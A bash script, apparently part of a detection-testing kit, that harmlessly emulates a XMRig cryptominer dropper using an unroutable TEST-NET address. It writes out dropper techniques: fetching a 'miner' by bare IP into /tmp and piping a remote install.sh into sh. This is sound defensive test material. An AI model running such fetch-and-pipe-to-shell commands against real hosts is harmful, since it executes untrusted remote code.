#!/usr/bin/env bash
# xmrig.sh - benign emulation of a XMRig / cryptominer dropper for detection-rule testing.
#
# What a miner dropper does on a victim: curl a miner binary down from a bare IP into a scratch
# dir, then curl an installer and pipe it straight into a shell. This does the harmless analogue:
# it curls an UNROUTABLE TEST-NET address (nothing is reachable, nothing is downloaded, the shell
# therefore receives empty input and does nothing), writing into its own scratch, cleaned up on
# exit. No miner, no payload, no persistence. See ./README.md.
#
# Imitates: XMRig / coin-miner dropper (fetch-by-IP into scratch, curl | sh install)
# Expected rules: download_ip_to_tmp, pipe_to_shell
set -u
work=$(mktemp -d) || exit 0
trap 'rm -rf "$work" 2>/dev/null' EXIT

# 192.0.2.0/24 is TEST-NET-1 (RFC 5737): guaranteed unroutable. The point is the audit event, not
# any transfer - every curl below fails fast and leaves nothing behind.

# --- TTP: fetch the "miner" by IP literal into a scratch dir -> download_ip_to_tmp ---
curl -s --max-time 2 "http://192.0.2.10/xmrig" -o "$work/xmrig" >/dev/null 2>&1 || true
# the rule keys on /tmp,/dev/shm,/var/tmp specifically; mirror the classic path too, still nothing lands
curl -s --max-time 2 "http://192.0.2.10/xmrig" -o /tmp/xmrig-emul 2>/dev/null || true
rm -f /tmp/xmrig-emul 2>/dev/null || true

# --- TTP: curl an installer piped into a shell, as one shell command line -> pipe_to_shell ---
# bash -c so the whole `curl ... | sh` is one process's argv (what the rule matches); the curl
# returns nothing, so sh reads EOF immediately and runs nothing.
timeout 3 bash -c 'curl -s --max-time 2 http://192.0.2.10/install.sh | sh' >/dev/null 2>&1 || true

exit 0
